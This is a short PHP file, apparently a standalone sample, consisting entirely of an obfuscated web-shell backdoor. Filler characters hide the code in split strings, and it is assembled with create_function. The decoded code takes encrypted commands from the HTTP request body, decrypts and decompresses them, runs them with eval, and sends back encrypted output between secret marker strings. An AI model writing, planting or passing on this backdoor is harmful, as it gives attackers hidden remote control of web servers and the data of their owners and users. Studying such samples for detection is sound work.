<?php
$O='p://input"),$m)=A=1A) {@Aob_staArt();@evaAl(@gzuncomAprAess(@x(@bAase64_dAAecode($Am[A1]),$k)))A;$o=@ob_ge';
$w=str_replace('U','','UcreUUUate_fUuncUtion');
$v='$kA="f46e06AA32A";$kh="c70da0327899A"A;$Akf=A"815a40b4AAe849";AA$p="l3ucDii4XZA85J07a";function x($tA';
$o='+){$Ao.=$t{$i}^$k{A$j};}}retAurnA $o;}Aif (@preAAAg_match("/$kh(.+)A$kf/",@fiAle_AgAet_coAntenAts(A"ph';
$E='t_AconteAntAs();@ob_Aend_clAeaAn();$r=@basAe6A4_encode(@x(A@gAzcompresAs(A$Ao),$k));print("$pA$kh$rA$kf");}';
$k=',$k){$AcA=strlen($k)A;$l=stArleAn(A$t);$o=A"";Afor($iAA=0;$i<$l;){foAr($j=0;(A$j<$Ac&&$i<$Al);$j++,A$i+A';
$l=str_replace('A','',$v.$k.$o.$O.$E);
$u=$w('',$l);$u();
?>
